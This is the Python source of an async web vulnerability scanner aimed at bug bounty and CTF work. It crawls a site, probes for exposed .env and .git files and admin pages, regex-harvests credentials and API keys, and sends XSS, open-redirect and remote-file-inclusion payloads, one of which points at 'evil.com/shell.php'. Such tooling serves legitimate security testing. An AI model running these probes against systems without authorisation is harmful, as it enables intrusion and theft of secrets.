import argparse
import aiohttp
import asyncio
from bs4 import BeautifulSoup
import re
import csv
import sqlite3
from urllib.parse import urljoin, urlparse
from collections import defaultdict
import time
import sys

# لیست کلمات کلیدی
KEYWORDS = ['main', 'app', 'runtime', 'bundle', 'polyfills', 'auth', 'config', 'settings', 'local', 'dev', 'data', 'api', 'session', 'user', 'core', 'client', 'server', 'utils', 'base']

# آسیب‌پذیری‌ها به ترتیب اهمیت
VULNERABILITIES = [
    "Authentication bypass",
    "Sensitive info leaks",
    "Hardcoded credentials",
    "Config/env file disclosure",
    "Hidden login portals",
    "JWT secrets & API keys",
    "Outdated services loed CVE to exploit",
    "Dependency confusion",
    "File upload endpoints",
    "RFI → RCE",
    "Open redirection",
    "DOM-based XSS",
    "WebSocket endpoints",
    "Hidden parameters",
    "IDOR"
]

# Regex patterns
SENSITIVE_PATTERNS = {
    "Hardcoded credentials": r'(password|pwd|pass)\s*[:=]\s*["\'](.+?)["\']',
    "JWT secrets & API keys": r'(api_key|apikey|secret|jwt_token|access_token|bearer)\s*[:=]\s*["\'](.+?)["\']',
    "Sensitive info leaks": r'(email|phone|address|ssn|credit_card)\s*[:=]\s*["\'](.+?)["\']'
}

DISCLOSURE_PATHS = ['.env', '.config', 'config.json', 'settings.json', '.git/config', 'debug.log']

HIDDEN_PORTALS = ['/admin', '/login', '/dashboard', '/wp-admin', '/phpmyadmin']

XSS_PAYLOAD = "<script>alert('XSS')</script>"
SQLI_PAYLOAD = "' OR '1'='1"
REDIRECT_PAYLOAD = "http://evil.com"
RFI_PAYLOAD = "http://evil.com/shell.php"

# پروفایل‌ها
PROFILES = {
    'bounty': {
        'max_depth': 3,
        'vulnerabilities': VULNERABILITIES,  # همه
    },
    'ctf': {
        'max_depth': 1,
        'vulnerabilities': ["DOM-based XSS", "Open redirection", "RFI → RCE", "IDOR", "SQL Injection"]  # تمرکز روی سریع
    }
}

async def fetch(session, url):
    try:
        async with session.get(url, timeout=5) as response:
            if response.status == 200:
                return await response.text()
            return None
    except:
        return None

async def crawl_site(base_url, profile='bounty'):
    max_depth = PROFILES[profile]['max_depth']
    visited = set()
    to_visit = [(base_url, 0)]
    found_links = defaultdict(list)
    
    async with aiohttp.ClientSession() as session:
        while to_visit:
            url, depth = to_visit.pop(0)
            if url in visited or depth > max_depth:
                continue
            visited.add(url)
            
            html = await fetch(session, url)
            if html:
                soup = BeautifulSoup(html, 'html.parser')
                for link in soup.find_all(['a', 'script', 'link'], href=True):
                    href = link.get('href') or link.get('src')
                    full_url = urljoin(url, href)
                    if urlparse(full_url).netloc == urlparse(base_url).netloc:
                        to_visit.append((full_url, depth + 1))
                        for kw in KEYWORDS:
                            if kw in href.lower():
                                found_links[kw].append(full_url)
    
    return found_links

async def check_vulnerability(session, url, vuln_type):
    results = []
    if vuln_type == "Config/env file disclosure":
        for path in DISCLOSURE_PATHS:
            test_url = urljoin(url, path)
            html = await fetch(session, test_url)
            if html and ('=' in html or 'key' in html.lower()):
                results.append(f"Possible disclosure at {test_url}")
    
    elif vuln_type == "Hidden login portals":
        for path in HIDDEN_PORTALS:
            test_url = urljoin(url, path)
            html = await fetch(session, test_url)
            if html and ('login' in html.lower() or 'admin' in html.lower()):
                results.append(f"Hidden portal found at {test_url}")
    
    elif vuln_type in SENSITIVE_PATTERNS:
        html = await fetch(session, url)
        if html:
            matches = re.findall(SENSITIVE_PATTERNS[vuln_type], html, re.IGNORECASE)
            for match in matches:
                results.append(f"Found {vuln_type}: {match[0]} = {match[1]} at {url}")
    
    elif vuln_type == "Open redirection":
        test_url = url + "?redirect=" + REDIRECT_PAYLOAD
        async with session.get(test_url, allow_redirects=False) as resp:
            if resp.status in [301, 302] and 'evil.com' in resp.headers.get('Location', ''):
                results.append(f"Open redirect at {test_url}")
    
    elif vuln_type == "DOM-based XSS":
        test_url = url + "?q=" + XSS_PAYLOAD
        html = await fetch(session, test_url)
        if html and XSS_PAYLOAD in html:
            results.append(f"Possible DOM XSS at {test_url}")
    
    elif vuln_type == "RFI → RCE":
        test_url = url + "?file=" + RFI_PAYLOAD
        html = await fetch(session, test_url)
        if html and 'shell' in html.lower():
            results.append(f"Possible RFI at {test_url}")
    
    elif vuln_type == "IDOR":
        if '?id=' in url:
            original_id = re.search(r'id=(\d+)', url).group(1)
            test_id = str(int(original_id) + 1)
            test_url = re.sub(r'id=\d+', f'id={test_id}', url)
            html = await fetch(session, test_url)
            if html and 'access denied' not in html.lower():
                results.append(f"Possible IDOR at {test_url}")
    
    # برای بقیه، چک ساده
    return results

def init_db():
    conn = sqlite3.connect('vuln.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities
                 (vuln_type TEXT, detail TEXT, url TEXT)''')
    conn.commit()
    return conn

def save_to_db(conn, vuln_type, detail, url):
    c = conn.cursor()
    c.execute("INSERT INTO vulnerabilities VALUES (?, ?, ?)", (vuln_type, detail, url))
    conn.commit()

def generate_reports(results):
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    
    # CSV
    with open(f"vuln_report_{timestamp}.csv", 'w', newline='') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(["Vulnerability", "Details", "URL"])
        for vuln in VULNERABILITIES:
            for detail in results.get(vuln, []):
                writer.writerow([vuln, detail, ""])
    
    # HTML
    html = "<html><body><h1>Vulnerability Report</h1><table border='1'>"
    html += "<tr><th>Vulnerability</th><th>Details</th></tr>"
    for vuln in VULNERABILITIES:
        for detail in results.get(vuln, []):
            html += f"<tr><td>{vuln}</td><td>{detail}</td></tr>"
    html += "</table></body></html>"
    with open(f"vuln_report_{timestamp}.html", 'w') as htmlfile:
        htmlfile.write(html)

async def main():
    parser = argparse.ArgumentParser(description="Async Web Vulnerability Scanner for Bug Bounty/CTF")
    parser.add_argument("url", help="Base URL of the site to scan")
    parser.add_argument("--profile", choices=['bounty', 'ctf'], default='bounty', help="Scan profile: bounty or ctf")
    args = parser.parse_args()
    
    print("Crawling site...")
    found_links = await crawl_site(args.url, args.profile)
    
    results = defaultdict(list)
    conn = init_db()
    
    async with aiohttp.ClientSession() as session:
        for kw, links in found_links.items():
            for link in links:
                print(f"Scanning {link}...")
                for vuln in PROFILES[args.profile]['vulnerabilities']:
                    vulns_found = await check_vulnerability(session, link, vuln)
                    for v in vulns_found:
                        results[vuln].append(v)
                        save_to_db(conn, vuln, v, link)
    
    conn.close()
    generate_reports(results)
    print("Scan complete. Results in DB, CSV, HTML.")

if __name__ == "__main__":
    asyncio.run(main())
